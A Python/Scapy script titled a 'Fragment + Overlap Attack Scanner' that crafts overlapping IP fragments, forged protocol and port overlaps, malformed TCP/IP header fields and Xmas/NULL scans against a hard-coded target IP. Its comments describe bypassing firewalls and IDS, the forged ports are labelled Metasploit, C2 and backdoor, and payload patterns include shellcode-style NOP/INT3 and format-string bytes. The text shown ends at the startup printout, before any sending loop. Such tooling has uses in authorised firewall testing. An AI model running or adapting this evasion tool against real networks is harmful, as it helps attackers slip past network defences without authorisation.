from scapy.all import *
from itertools import permutations, product
import os, sys

# ================================================================
#   FRAGMENT + OVERLAP ATTACK SCANNER v5
#   Run as: sudo python3 frag_scan.py
# ================================================================

target = "192.31.242.65"

# ================================================================
#  ★★★ ON/OFF SWITCHES — EDIT HERE ★★★
# ================================================================

enable_section1_whitelist  = True   # Whitelist protocol sweep
enable_section2_forged     = False   # Forged protocol sweep
enable_payload_overlap     = False   # Section 4A — payload bytes conflict (fragment mode)
enable_ip_payload_overlap  = False   #   └─ IP layer payload overlap (fragment attack)
enable_tcp_payload_overlap = False   #   └─ TCP layer payload overlap (fragment attack)
enable_ip_plain_payload    = True   #   └─ IP plain payload sweep (non-fragment mode)
enable_tcp_plain_payload   = False   #   └─ TCP plain payload sweep (non-fragment mode)
enable_proto_overlap       = False   # Section 4B — IP protocol conflict
enable_port_overlap        = False   # Section 4C — TCP/UDP/SCTP/DCCP port conflict

enable_fragment            = False   # True  → send fragmented packets
                                    # False → send plain packets; Sections 3/4A/4B/4C skip

enable_bogus_length        = False   # L4 bogus length/offset field test
                                    # TCP=bogus dataofs | UDP/SCTP/DCCP=bogus len field
enable_tcp_flags           = False   # TCP flag combinations sweep (proto=6 only)
enable_tcp_options         = False   # TCP options field sweep (MSS/WScale/Timestamp/raw bytes)
enable_tcp_dataofs         = False   # TCP data offset (header length) bogus values sweep
enable_tcp_urgptr          = False   # TCP urgent pointer bogus values sweep (URG flag)
enable_ip_options          = False   # IP options sweep (RR/NOP/Timestamp/raw bytes) — Section 5
enable_ihl                 = False   # IP header length (IHL) bogus values sweep


# ================================================================
#  SECTION A — TARGET + BASIC IP PARAMETERS
# ================================================================

ttl_list           = [10.11]
tos_list           = [0x00]
payload_size_list  = [1000]

# ── IP ID ────────────────────────────────────────────────────────
# "auto"   → Scapy picks automatically
# "manual" → use ip_id_list values
ip_id_mode = "auto"
ip_id_list = [0x0000, 0x1234, 0xdead, 0xbeef, 0xffff, 0x4141]
# Range hint: 0x0000 – 0xFFFF (0 to 65535)

# ================================================================
#  SECTION B — FRAGMENT OPTIONS
#  enable_fragment = True  → fragmented packets (Sections 3/4A/4B/4C active)
#  enable_fragment = False → plain packets only (Sections 3/4A/4B/4C skip)
# ================================================================

# Fragment sizes — multiples of 8 only (RFC 791)
# Odd numbers auto-rounded to nearest lower multiple of 8
# fragsize=8 → covers Tiny Fragment (RFC 1858) automatically
fragment_size_list = [8, 16, 24, 32, 64, 128, 256, 512]

# ── FRAGMENT SEND ORDER ──────────────────────────────────────────
# "all"    → all 6 permutations of [F1,F2,F3]
# "os"     → per-OS reassembly behavior (see table + list below)
# "custom" → only the tuples in fragment_order_custom
fragment_order_mode = "os"

# OS reassembly behavior reference:
#  ┌─────────────────┬────────┬─────────────┬──────────────────────────────────────────┐
#  │ OS              │ Policy │ Send Order  │ Behavior                                 │
#  ├─────────────────┼────────┼─────────────┼──────────────────────────────────────────┤
#  │ Linux_2x        │ first  │ F1->F2->F3 │ First frag wins overlap; in-order        │
#  │ Linux_3x_4x     │ last   │ F3->F2->F1 │ Last frag wins overlap; any order        │
#  │ Windows_XP      │ last   │ F2->F1->F3 │ Last frag wins; out-of-order reassembly  │
#  │ Windows_7_10    │ first  │ F1->F3->F2 │ First frag wins; RFC 791 preferred       │
#  │ Windows_2008    │ first  │ F1->F2->F3 │ First frag wins; drops heavy overlaps    │
#  │ BSD_FreeBSD     │ first  │ F1->F2->F3 │ First frag wins; strict first-arrival    │
#  │ macOS           │ first  │ F1->F3->F2 │ First frag wins (BSD inherit); strict    │
#  │ Cisco_IOS       │ last   │ F3->F1->F2 │ Last frag wins; out-of-order ok          │
#  │ Juniper_JunOS   │ first  │ F1->F2->F3 │ First frag wins; drops dup offsets       │
#  │ Solaris         │ last   │ F2->F3->F1 │ Last frag wins; tolerant of reorder      │
#  │ HP_UX           │ first  │ F1->F2->F3 │ First frag wins; drops overlaps          │
#  │ AIX             │ last   │ F3->F2->F1 │ Last frag wins; any order accepted       │
#  └─────────────────┴────────┴─────────────┴──────────────────────────────────────────┘
# Policy:
#   first = overlap zone keeps F1 data (F2 ignored)
#   last  = overlap zone keeps F2 data (overwrites F1)
#
# Add/remove entries to control which OS orders run:
fragment_order_os_list = [
    "Linux_2x",
    "Linux_3x_4x",
    "Windows_XP",
    "Windows_7_10",
    "Windows_2008",
    "BSD_FreeBSD",
    "macOS",
    "Cisco_IOS",
    "Juniper_JunOS",
    "Solaris",
    "HP_UX",
    "AIX",
]

# Custom order tuples (used only when fragment_order_mode="custom")
# 0=F1, 1=F2, 2=F3 → (2,1,0) = send F3 first, then F2, then F1
fragment_order_custom = [(0,1,2), (2,1,0), (1,0,2)]

# ================================================================
#  SECTION C — PROTOCOL ARRAYS
# ================================================================

# Whitelist = trusted/allowed (F1 in proto overlap, Section 1 sweep)
whitelist_protocols = {
    6:  "TCP",
    17: "UDP",
}

# Forged = unexpected protocols (F2 in proto overlap, Section 2 sweep)
forged_protocols = {
    41:  "IPv6-in-IPv4",
    47:  "GRE",
    50:  "ESP",
    51:  "AH",
    89:  "OSPF",
    132: "SCTP",
    253: "Experimental-1",
    254: "Experimental-2",
}

# ================================================================
#  SECTION D — LAYER 4 OPTIONS
# ================================================================

# L4 protocols that carry port numbers (used for port overlap 4C)
# Note: ICMP=type/code (no port) | GRE/ESP/AH/OSPF = no port field
l4_port_protocols = {
    6:   "TCP",
    17:  "UDP",
    132: "SCTP",   # Stream Control Transmission Protocol
    33:  "DCCP",   # Datagram Congestion Control Protocol
}

# ── BOGUS LENGTH ─────────────────────────────────────────────────
# Injects intentionally wrong length/offset fields per protocol:
#
# TCP  → no separate length field; uses dataofs (header length in 32-bit words)
#        TCP dataofs valid range : 5 – 15  (5×4=20B min header, 15×4=60B max)
#        bogus_length_list values used as TCP dataofs via raw struct injection
#
# UDP  → length field covers header + data
#        UDP length valid range  : 8 – 65535
#
# SCTP → chunk length field
#        SCTP valid range        : 12 – 65535
#
# DCCP → header length field
#        DCCP valid range        : 12 – 65535
#
# Each entry: (value, label) — label shown in output
bogus_length_list = [
    (0,     "zero-invalid"),          # clearly invalid for all protos
    (1,     "below-all-minimums"),    # below UDP min(8) and TCP min(5)
    (4,     "below-TCP-dataofs-min"), # TCP dataofs min=5; 4 = invalid
    (7,     "below-UDP-min"),         # one below UDP minimum (8)
    (19,    "below-TCP-20B-header"),  # below TCP 20B header (dataofs=5)
    (65535, "max-valid"),             # maximum 16-bit value
    (65536, "overflow-16bit"),        # overflows 16-bit → wraps on some stacks
    (9999,  "mid-bogus"),             # arbitrary mid-range bogus
]

# ── TCP FLAGS ────────────────────────────────────────────────────
# Flag bits: F=FIN S=SYN R=RST P=PSH A=ACK U=URG E=ECE C=CWR
# Hint:
#   "S"         = SYN only (normal connect)
#   "A"         = ACK only (stateless fw bypass)
#   "SA"        = SYN+ACK
#   "FA"        = FIN+ACK
#   "R"         = RST
#   "SF"        = SYN+FIN (invalid — scanning evasion)
#   "PA"        = PSH+ACK (data push)
#   "FSRPAUEC"  = ALL flags (Xmas scan)
#   ""          = no flags (NULL scan)
#   "FPU"       = FIN+PSH+URG (Xmas variant)
#   0x29        = SYN+URG+FIN (bitmask)
tcp_flag_list = [
    "S", "A", "SA", "FA", "R", "SF",
    "PA", "FSRPAUEC", "", "FPU", 0x29,
]

# ── TCP ADVANCED FIELDS ─────────────────────────────────────────
# Individual on/off flags (top of script):
#   enable_tcp_dataofs / enable_tcp_urgptr / enable_tcp_options
#   enable_ihl / enable_ip_options
# These craft unusual TCP header field values to confuse
# firewalls, IDS, and middleboxes during inspection

# TCP Data Offset (dataofs) — header length in 32-bit words
# Valid range: 5 – 15  (5×4=20B min header, 15×4=60B max with options)
# Hint:
#   5  = normal 20B header (no options)
#   6  = 24B (4B options)
#   15 = 60B (40B options, maximum)
#   0  = bogus zero (clearly invalid)
#   3  = too small (below 5 min)
#   255= way out of range
tcp_dataofs_list = [
    5,    # normal
    6,    # small option
    10,   # mid-range
    15,   # maximum valid
    0,    # bogus zero
    3,    # below minimum
    255,  # out-of-range overflow
]

# TCP Urgent Pointer — only meaningful when URG flag set
# Valid range: 0 – 65535
# Hint:
#   0     = no urgent data (normal)
#   1     = one byte urgent
#   100   = typical urgent window
#   65535 = maximum pointer (points beyond segment)
#   0xdead= bogus value (testing parser)
tcp_urgptr_list = [
    0,       # no urgent data
    1,       # minimal urgent
    100,     # typical
    65535,   # max pointer
    0xdead,  # bogus
]

# TCP Options — 3 accepted formats:
#
#   Format 1 — Scapy tuple list (standard):
#     [("MSS",1460), ("NOP",None), ("WScale",6)]
#
#   Format 2 — Raw bytes (injected directly, bypasses Scapy parser):
#     b'\x08\x0a\x00\x00\x00\x01\x00\x00\x00\x00'
#     → kind=8 (Timestamp), len=10, tsval=1, tsecr=0
#
#   Format 3 — Mixed list of tuples (standard only, raw handled via F2):
#     [("NOP",None), ("MSS",1460)]
#
# Valid TCP option kinds:
#   0   = EOL  (End of Option List)
#   1   = NOP  (padding, 1 byte)
#   2   = MSS  — 4B: \x02\x04 + value(2B)
#   3   = WScale — 3B: \x03\x03 + shift(1B)
#   4   = SAckOK — 2B: \x04\x02
#   5   = SACK — variable
#   8   = Timestamp — 10B: \x08\x0a + tsval(4B) + tsecr(4B)
#   254 = Experimental (RFC4727)
tcp_options_list = [
    # ── Scapy tuple format ─────────────────────────────────────
    [("NOP",None),("NOP",None)],                           # padding only
    [("MSS",1460)],                                        # normal MSS
    [("MSS",0)],                                           # bogus MSS zero
    [("MSS",65535)],                                       # max MSS
    [("WScale",0)],                                        # window scale 0
    [("WScale",14)],                                       # window scale max valid
    [("SAckOK",b"")],                                      # SACK permitted
    [("Timestamp",(0,0))],                                 # timestamp zero
    [("Timestamp",(0xffffffff,0xffffffff))],               # timestamp max
    [("NOP",None),("NOP",None),("MSS",1460),("WScale",6)], # combined normal
    [(254, b"\xde\xad")],                                  # experimental bogus
    [(0,  b"")],                                           # EOL only
    # ── Raw bytes format (direct injection) ────────────────────
    b'\x08\x0a\x00\x00\x00\x01\x00\x00\x00\x02',          # Timestamp raw: tsval=1 tsecr=2
    b'\x02\x04\x05\xb4',                                   # MSS=1460 raw
    b'\x03\x03\x08',                                       # WScale=8 raw
    b'\x04\x02',                                           # SAckOK raw
    b'\x00',                                               # EOL raw (1 byte)
    b'\x01\x01\x01\x01',                                   # 4× NOP raw
    b'\xde\xad\xbe\xef',                                   # completely bogus raw
]

# IP Header Length (IHL) — in 32-bit words
# Valid range: 5 – 15  (5=20B min, 15=60B max with options)
# Note: IHL mismatch from actual header can confuse parsers
# Hint:
#   5  = normal no-option header
#   6  = claims 24B (with options)
#   15 = claims 60B (max)
#   0  = bogus (triggers parser errors)
#   4  = below minimum (less than 20B)
ihl_list = [
    5,    # normal
    6,    # one option word claimed
    15,   # max claimed
    0,    # bogus zero
    4,    # below minimum
]

# ================================================================
#  SECTION E — OVERLAP SETTINGS
#  Note: ALL overlap sections (4A/4B/4C) need "Fragment" in
#        fragment_mode_list — auto-skip if Fragment disabled
# ================================================================

# ── PAYLOAD PATTERN NAMES — USER SELECTS FROM LIST ───────────────
# Script generates actual bytes from name + size automatically
# Size comes from payload_size_list (Section A)
# Pattern × Size = matrix of all combinations
#
# Available pattern names:
#   "zero"        → all 0x00 bytes               (numeric)
#   "max"         → all 0xFF bytes               (numeric)
#   "alpha_A"     → all 0x41 ('A') bytes         (alpha)
#   "alpha_B"     → all 0x42 ('B') bytes         (alpha)
#   "alpha_C"     → all 0x43 ('C') bytes         (alpha)
#   "numeric_inc" → 0x00,0x01,0x02... ascending  (numeric)
#   "numeric_dec" → 0xFF,0xFE,0xFD... descending (numeric)
#   "hex_dead"    → 0xDE 0xAD 0xBE 0xEF repeat  (hex)
#   "hex_cafe"    → 0xCA 0xFE 0xBA 0xBE repeat  (hex)
#   "hex_1234"    → 0x12 0x34 0x56 0x78 repeat  (hex)
#   "mixed_1"     → 0x41 0x42 0x00 0xFF repeat  (mixed)
#   "mixed_2"     → 0x90 0x41 0xCC 0x00 repeat  (mixed)
#   "mixed_3"     → 0xDE 0x41 0x00 0xFF repeat  (mixed)
#   "shellcode"   → NOP×4 + INT3 repeat          (shellcode)
#   "format_str"  → %x%x%x%x%n%s repeat          (format string)
#   "random"      → os.urandom(size) each call   (random)
#
# Add names to use them — script generates bytes at runtime:
payload_pattern_names = [
    "zero",
    "max",
    "alpha_A",
    "alpha_B",
    "numeric_inc",
    "numeric_dec",
    "hex_dead",
    "hex_cafe",
    "mixed_1",
    "mixed_2",
    "shellcode",
    "format_str",
]

# overlap_pairs: None = auto-generate from payload_pattern_names × sizes
# Manual override: overlap_pairs = {"custom": (b"\x41"*48, b"\x42"*48)}
overlap_pairs = None

# ── PROTOCOL OVERLAP (Section 4B) ───────────────────────────────
# Auto-generated from whitelist_protocols × forged_protocols
# F1 = whitelist proto (firewall ALLOW) | F2 = forged proto (bypass)
# OS send order from fragment_order_os_list decides first/last policy

# ── PORT OVERLAP (Section 4C) ────────────────────────────────────
# Uses l4_port_protocols (TCP/UDP/SCTP/DCCP) — all port-capable
# "all" = all l4_port_protocols | "TCP" | "UDP" | "SCTP" | "DCCP"
port_overlap_transport = "all"

# Whitelist ports = F1 trusted (firewall sees → ALLOW)
whitelist_ports = [
    21,    # FTP
    22,    # SSH
    25,    # SMTP
    53,    # DNS
    80,    # HTTP
    110,   # POP3
    123,   # NTP
    443,   # HTTPS
    3389,  # RDP
]

# Forged ports = F2 real dest (overwrites at reassembly)
forged_ports = [
    4444,   # Metasploit
    8080,   # HTTP-alt
    8443,   # HTTPS-alt
    9090,   # C2
    1337,   # backdoor
    31337,  # elite backdoor
    4000,   # misc
    6666,   # IRC/misc
]

# None = auto-generate whitelist × forged pairs
# Manual override: port_overlap_pairs = {"p80_vs_4444": (80, 4444)}
port_overlap_pairs = None

# ================================================================
#  SECTION F — IP OPTIONS (Section 5 combo)
# ================================================================
# 3 accepted formats:
#
#   Format 1 — Scapy named objects (standard):
#     [IPOption_RR()]
#     [IPOption_NOP(), IPOption_NOP()]
#
#   Format 2 — IPOption(bytes) in list (raw bytes wrapped):
#     [IPOption(b'\x01\x01\x01\x00')]
#     [IPOption(b'\x44\x04\x05\x00')]   # Timestamp option raw
#
#   Format 3 — raw bytes assigned to .options (direct inject):
#     b'\x01\x01\x01\x00'               # NOP NOP NOP EOL
#     b'\x07\x0b\x04' + b'\x00'*8       # RR skeleton raw
#
# IP Option kind reference:
#   0x00 = EOL  (End of Option List)
#   0x01 = NOP  (No Operation / padding)
#   0x07 = RR   (Record Route)
#   0x44 = TS   (Timestamp)
#   0x83 = LSRR (Loose Source Record Route)
#   0x89 = SSRR (Strict Source Record Route)
#   0x94 = SID  (Stream ID, obsolete)
#   0x82 = SEC  (Security, obsolete)
ip_options_list = {
    # ── Scapy named objects ────────────────────────────────────
    "NoOption"      : [],
    "RR"            : [IPOption_RR()],
    "NOP"           : [IPOption_NOP()],
    "Timestamp"     : [IPOption_Timestamp()],
    "NOP×4"         : [IPOption_NOP(), IPOption_NOP(),
                       IPOption_NOP(), IPOption_NOP()],
    # ── IPOption(bytes) format ─────────────────────────────────
    "Raw_NOP3_EOL"  : [IPOption(b'\x01\x01\x01\x00')],    # 3×NOP + EOL
    "Raw_TS_bogus"  : [IPOption(b'\x44\x08\x05\x00'       # Timestamp kind+len+ptr+flg
                                + b'\x00'*4)],             # 8B total (min valid)
    "Raw_RR_bogus"  : [IPOption(b'\x07\x07\x04'          # RR kind+len+ptr
                                + b'\x00'*4)],             # 7B total
    "Raw_LSRR"     : [IPOption(b'\x83\x07\x04'           # LSRR kind+len+ptr
                                + b'\x00'*4)],             # 7B total
    "Raw_bogus_FF"  : [IPOption(b'\xff\x04\x00\x00')],    # unknown kind=0xFF
    # ── bytes direct format (assign to .options) ───────────────
    "Bytes_NOP4"    : b'\x01\x01\x01\x00',                # 4 bytes: NOP×3+EOL
    "Bytes_custom"  : b'\x94\x04\x00\x00',                # SID option raw
    "Bytes_bogus"   : b'\xde\xad\xbe\xef',                # fully bogus
}

# ================================================================
#  DERIVED / AUTO-COMPUTED — DO NOT EDIT BELOW THIS LINE
# ================================================================

# Derive fragment_mode_list from single flag
# True  → Fragment only
# False → NoFragment (plain) only
fragment_mode_list = ["Fragment"] if enable_fragment else ["NoFragment"]

# Fragment mode guard — used by sections 3/4A/4B/4C
_frag_enabled = enable_fragment

# Auto-align fragment sizes to multiples of 8
fragment_size_list = sorted(set(max(8,(f//8)*8) for f in fragment_size_list))

# IP ID iterator
def get_ip_id():
    return [None] if ip_id_mode == "auto" else ip_id_list

# ── PATTERN GENERATOR ────────────────────────────────────────────
# Generates actual bytes from pattern name + size at runtime
# User only sets names in payload_pattern_names + sizes in payload_size_list
import os as _os

_PATTERN_BASE = {
    "zero"        : lambda n: b"\x00" * n,
    "max"         : lambda n: b"\xff" * n,
    "alpha_A"     : lambda n: b"\x41" * n,
    "alpha_B"     : lambda n: b"\x42" * n,
    "alpha_C"     : lambda n: b"\x43" * n,
    "numeric_inc" : lambda n: bytes([i % 256 for i in range(n)]),
    "numeric_dec" : lambda n: bytes([(255 - i) % 256 for i in range(n)]),
    "hex_dead"    : lambda n: (b"\xde\xad\xbe\xef" * ((n//4)+1))[:n],
    "hex_cafe"    : lambda n: (b"\xca\xfe\xba\xbe" * ((n//4)+1))[:n],
    "hex_1234"    : lambda n: (b"\x12\x34\x56\x78" * ((n//4)+1))[:n],
    "mixed_1"     : lambda n: (b"\x41\x42\x00\xff" * ((n//4)+1))[:n],
    "mixed_2"     : lambda n: (b"\x90\x41\xcc\x00" * ((n//4)+1))[:n],
    "mixed_3"     : lambda n: (b"\xde\x41\x00\xff" * ((n//4)+1))[:n],
    "shellcode"   : lambda n: ((b"\x90"*4 + b"\xcc") * ((n//5)+1))[:n],
    "format_str"  : lambda n: (b"%x%x%x%x%n%s" * ((n//12)+1))[:n],
    "random"      : lambda n: _os.urandom(n),
}

def gen_payload(name, size):
    """Generate payload bytes from pattern name + size"""
    if name not in _PATTERN_BASE:
        raise ValueError(f"Unknown pattern '{name}'. Available: {list(_PATTERN_BASE.keys())}")
    return _PATTERN_BASE[name](size)

# Validate user-supplied pattern names at startup
_invalid = [n for n in payload_pattern_names if n not in _PATTERN_BASE]
if _invalid:
    print(f"[ERROR] Unknown payload pattern names: {_invalid}")
    print(f"        Valid names: {list(_PATTERN_BASE.keys())}")
    sys.exit(1)

# Build payload_patterns dict: name → bytes at minimum overlap size (48B)
# Used for overlap pair generation — actual sweep uses gen_payload(name, size)
payload_patterns = {n: gen_payload(n, 48) for n in payload_pattern_names}

# Auto-generate overlap pairs from payload_pattern_names
# Each unique (A,B) pair where bytes 8-15 differ = real conflict
if overlap_pairs is None:
    _pnames = payload_pattern_names
    overlap_pairs = {}
    for i in range(len(_pnames)):
        for j in range(i+1, len(_pnames)):
            n1, n2 = _pnames[i], _pnames[j]
            b1 = gen_payload(n1, 48)
            b2 = gen_payload(n2, 48)
            if b1[8:16] != b2[8:16]:   # real conflict check
                overlap_pairs[f"{n1}_vs_{n2}"] = (b1, b2)

# Auto-generate protocol overlap pairs: whitelist × forged
proto_overlap_pairs = {}
for (wk,wv),(fk,fv) in product(whitelist_protocols.items(),
                                forged_protocols.items()):
    proto_overlap_pairs[f"{wv}_vs_{fv.split()[0]}"] = (wk,wv,fk,fv)

# Auto-generate port overlap pairs
if enable_port_overlap and _frag_enabled:
    if port_overlap_pairs is None:
        port_overlap_pairs = {}
        for wp,fp in product(whitelist_ports, forged_ports):
            port_overlap_pairs[f"p{wp}_vs_p{fp}"] = (wp,fp)
    if port_overlap_transport == "all":
        port_transport_list = list(l4_port_protocols.items())
    else:
        port_transport_list = [(k,v) for k,v in l4_port_protocols.items()
                               if v == port_overlap_transport]

# OS reassembly order map
os_frag_orders = {
    "Linux_2x":      ((0,1,2), "first", "Linux 2.x  — first-wins, in-order"),
    "Linux_3x_4x":   ((2,1,0), "last",  "Linux 3/4  — last-wins, any order"),
    "Windows_XP":    ((1,0,2), "last",  "Win XP     — last-wins, out-of-order"),
    "Windows_7_10":  ((0,2,1), "first", "Win 7/10   — first-wins, RFC791"),
    "Windows_2008":  ((0,1,2), "first", "Win 2008   — first-wins, drops heavy overlap"),
    "BSD_FreeBSD":   ((0,1,2), "first", "FreeBSD    — first-wins, strict arrival"),
    "macOS":         ((0,2,1), "first", "macOS      — first-wins (BSD inherit)"),
    "Cisco_IOS":     ((2,0,1), "last",  "Cisco IOS  — last-wins, out-of-order ok"),
    "Juniper_JunOS": ((0,1,2), "first", "JunOS      — first-wins, drops dup offsets"),
    "Solaris":       ((1,2,0), "last",  "Solaris    — last-wins, tolerant reorder"),
    "HP_UX":         ((0,1,2), "first", "HP-UX      — first-wins, drops overlaps"),
    "AIX":           ((2,1,0), "last",  "AIX        — last-wins, any order"),
}

def get_frag_orders(n):
    """Returns list of (order_tuple, os_name, policy, desc)"""
    if fragment_order_mode == "all":
        return [(o,"all","-","all permutations") for o in permutations(range(n))]
    elif fragment_order_mode == "os":
        seen, result = [], []
        for os_name in fragment_order_os_list:
            if os_name not in os_frag_orders:
                continue
            order, policy, desc = os_frag_orders[os_name]
            # Trim to n frags, fill missing
            trimmed = tuple(i for i in order if i < n)
            missing = [i for i in range(n) if i not in trimmed]
            trimmed = trimmed + tuple(missing)
            if trimmed not in seen:
                seen.append(trimmed)
                result.append((trimmed, os_name, policy, desc))
        return result if result else [((0,1,2),"default","first","Default in-order")]
    else:  # custom
        return [(o,"custom","-","user-defined")
                for o in fragment_order_custom if max(o) < n]

def make_ip(dst, ttl, tos, proto, ip_id=None, options=[], flags=0, frag=0):
    kw = dict(dst=dst, ttl=ttl, tos=tos, proto=proto,
              options=options, flags=flags, frag=frag)
    if ip_id is not None:
        kw["id"] = ip_id
    return IP(**kw)

def build_l4_hdr(proto_num, sport=1234, dport=80, flags="S", length=None):
    if proto_num == 6:
        t = TCP(sport=sport, dport=dport, flags=flags)
        return bytes(t)[:20]
    elif proto_num == 17:
        u = UDP(sport=sport, dport=dport)
        if length is not None:
            u.len = length
        return bytes(u)[:8]
    elif proto_num == 132:
        return bytes(SCTP(sport=sport, dport=dport))[:12]
    elif proto_num == 33:
        try:
            return bytes(DCCP(sport=sport, dport=dport))[:12]
        except Exception:
            return struct.pack("!HH", sport, dport) + b"\x00"*8
    return b"\x00"*8

def normalize_tcp_options(opts):
    """
    Accept tcp_options_list entries in any supported format:
      - list of tuples  → [("MSS",1460), ("NOP",None)]
      - raw bytes       → b'\\x08\\x0a\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00'
    Returns (mode, value):
      mode="tuple" → pass to TCP(options=value)
      mode="raw"   → inject as Raw() payload after TCP header
    """
    if isinstance(opts, (bytes, bytearray)):
        return ("raw", opts)
    elif isinstance(opts, list):
        return ("tuple", opts)
    else:
        return ("tuple", [])

def normalize_ip_options(opts):
    """
    Accept ip_options_list values in any supported format:
      - []                          → no options
      - [IPOption_RR()]             → Scapy named objects
      - [IPOption(b'\\x01...')]     → IPOption(bytes) wrapped
      - b'\\x01\\x01\\x01\\x00'    → raw bytes assigned to .options
    Returns (mode, value):
      mode="list"  → pass to IP(options=value)
      mode="raw"   → assign to pkt.options after creation
      mode="none"  → no options
    """
    if opts is None or opts == []:
        return ("none", [])
    elif isinstance(opts, (bytes, bytearray)):
        return ("raw", opts)
    elif isinstance(opts, list):
        return ("list", opts)
    else:
        return ("none", [])

def make_ip_with_options(dst, ttl, tos, proto, opts_val,
                         ip_id=None, flags=0, frag=0):
    """Build IP packet supporting all ip_options formats — safe with fallback"""
    mode, val = normalize_ip_options(opts_val)
    kw = dict(dst=dst, ttl=ttl, tos=tos, proto=proto,
              flags=flags, frag=frag)
    if ip_id is not None:
        kw["id"] = ip_id
    try:
        if mode == "list":
            kw["options"] = val
            return IP(**kw)
        elif mode == "raw":
            pkt = IP(**kw)
            pkt.options = val
            return pkt
        else:
            return IP(**kw)
    except Exception:
        # Fallback: build without options on error
        kw.pop("options", None)
        return IP(**kw)

def build_tcp_advanced(dataofs=None, urgptr=None, options=None,
                       sport=1234, dport=80, flags="S"):
    """
    Build TCP packet supporting all option formats:
      - options as tuple list → TCP(options=...)
      - options as raw bytes  → TCP header + Raw(load=bytes)
    Returns scapy packet layer (TCP or TCP/Raw)
    """
    kw = dict(sport=sport, dport=dport, flags=flags)
    if dataofs is not None: kw["dataofs"] = dataofs
    if urgptr  is not None: kw["urgptr"]  = urgptr

    if options is None:
        return TCP(**kw)

    mode, val = normalize_tcp_options(options)
    if mode == "tuple":
        kw["options"] = val
        return TCP(**kw)
    else:   # raw bytes
        # Adjust dataofs to account for raw option bytes
        opt_len = len(val)
        # TCP header = 20B, options add words of 4B
        total_hdr = 20 + opt_len
        # Pad to multiple of 4
        pad = (4 - (opt_len % 4)) % 4
        val_padded = val + b'\x00' * pad
        dofs = (20 + len(val_padded)) // 4
        kw["dataofs"] = min(dofs, 15)   # cap at max 15
        return TCP(**kw) / Raw(load=val_padded)

def make_ip_ihl(dst, ttl, tos, proto, ihl=None, ip_id=None):
    """Build IP packet with optional bogus IHL override"""
    kw = dict(dst=dst, ttl=ttl, tos=tos, proto=proto)
    if ip_id is not None: kw["id"]  = ip_id
    if ihl   is not None: kw["ihl"] = ihl
    return IP(**kw)

icmp_type_map = {
    0:  ("Echo Reply",       {0:"Echo Reply"}),
    3:  ("Dest Unreachable", {0:"Net Unreachable",1:"Host Unreachable",
                              2:"Protocol Unreachable",3:"Port Unreachable",
                              4:"Frag Needed",5:"SrcRoute Failed",
                              9:"Net Admin Prohibited",10:"Host Admin Prohibited",
                              13:"Comm Admin Prohibited"}),
    4:  ("Source Quench",    {0:"Source Quench"}),
    5:  ("Redirect",         {0:"Redirect Net",1:"Redirect Host"}),
    8:  ("Echo Request",     {0:"Echo Request"}),
    11: ("Time Exceeded",    {0:"TTL Exceeded",1:"Frag Reassembly Exceeded"}),
    12: ("Param Problem",    {0:"Pointer Error",1:"Missing Option",2:"Bad Length"}),
    13: ("Timestamp Req",    {0:"Timestamp Request"}),
    14: ("Timestamp Reply",  {0:"Timestamp Reply"}),
}

def decode_icmp(t,c):
    if t in icmp_type_map:
        return f"{icmp_type_map[t][0]} | {icmp_type_map[t][1].get(c,f'Code-{c}')}"
    return f"ICMP T={t} C={c}"

def get_reply_info(r):
    icmp_str = "Non-ICMP Reply"
    extra    = []
    if r.haslayer(ICMP):
        icmp_str = decode_icmp(r[ICMP].type, r[ICMP].code)
    for opt in r[IP].options:
        if hasattr(opt,"routers"):
            ips = [str(i) for i in opt.routers if str(i)!="0.0.0.0"]
            if ips: extra.append("RR:"+">".join(ips))
        if hasattr(opt,"timestamps") and opt.timestamps:
            extra.append(f"TS:{opt.timestamps}")
    return icmp_str, " | ".join(extra) if extra else "-"

def print_header():
    h = f"  {'#':>5} | {'Name':<24} | {'OS/Tag':<18} | {'Policy':<6} | {'Reply From':<16} | {'ICMP Response':<34} | RR/TS"
    print(h)
    print("  " + "-"*len(h))

def send_pkt(label, name, os_tag, policy, pkt):
    try:
        r = sr1(pkt, timeout=3, retry=1, verbose=False)
        if r:
            icmp_str, info = get_reply_info(r)
            print(f"  {str(label):>5} | {name:<24} | {os_tag:<18} | {policy:<6} | "
                  f"{r[IP].src:<16} | {icmp_str:<34} | {info}")
        else:
            print(f"  {str(label):>5} | {name:<24} | {os_tag:<18} | {policy:<6} | "
                  f"{'TIMEOUT':<16} | {'No Reply':<34} | -")
    except Exception as e:
        print(f"  {str(label):>5} | {name:<24} | {os_tag:<18} | {policy:<6} | "
              f"{'ERROR':<16} | {str(e)[:34]:<34} | -")

def send_frags(frags_list, name):
    """Send fragment list in all OS-based orders with policy label"""
    for order, os_name, policy, desc in get_frag_orders(len(frags_list)):
        ostr = "->".join(f"F{i+1}" for i in order)
        for idx in order:
            f   = frags_list[idx]
            off = f[IP].frag * 8
            send_pkt(f"F{idx+1}", name,
                     f"{os_name}[{ostr}]", policy, f)

# ================================================================
#  ROOT CHECK + STARTUP SUMMARY
# ================================================================
if os.geteuid() != 0:
    print("[ERROR] Run as root: sudo python3 frag_scan.py")
    sys.exit(1)

print("\n" + "="*100)
print("  FRAGMENT + OVERLAP SCANNER v5")
print(f"  target              : {target}")
print(f"  enable_fragment     : {enable_fragment}   ← True=Fragment | False=Plain; S3/4A/4B/4C need True")
print(f"  fragment_mode_list  : {fragment_mode_list}  (auto from enable_fragment)")
print(f"  fragment_order_mode : {fragment_order_mode}  os_list={fragment_order_os_list if fragment_order_mode=='os' else 'N/A'}")
print(f"  ip_id_mode          : {ip_id_mode}")
print(f"  ── ON/OFF ──")
print(f"  Section 1 whitelist : {enable_section1_whitelist}")
print(f"  Section 2 forged    : {enable_section2_forged}")
print(f"  Tiny frag (RFC1858) : auto — covered by fragsize=8 in fragment_size_list when Fragment enabled")
print(f"  Section 4A payload  : {enable_payload_overlap}")
print(f"    ip_payload_overlap : {enable_ip_payload_overlap}  tcp_payload_overlap: {enable_tcp_payload_overlap}")
print(f"    ip_plain_payload   : {enable_ip_plain_payload}  tcp_plain_payload  : {enable_tcp_plain_payload}")
print(f"  payload_pattern_names: {payload_pattern_names}")
print(f"  payload_size_list    : {payload_size_list}")
print(f"  payload matrix       : {len(payload_pattern_names)} patterns × {len(payload_size_list)} sizes = {len(payload_pattern_names)*len(payload_size_list)} combinations")
print(f"  overlap_pairs        : {len(overlap_pairs)} (auto from pattern names, conflict-checked)")
print(f"  Section 4B protocol : {enable_proto_overlap}")
print(f"  Section 4C port     : {enable_port_overlap}")
print(f"  IP options (in S1)  : {enable_ip_options}  (merged into Section 1)")
print(f"  Bogus length        : {enable_bogus_length}")
print(f"  TCP flags           : {enable_tcp_flags}")
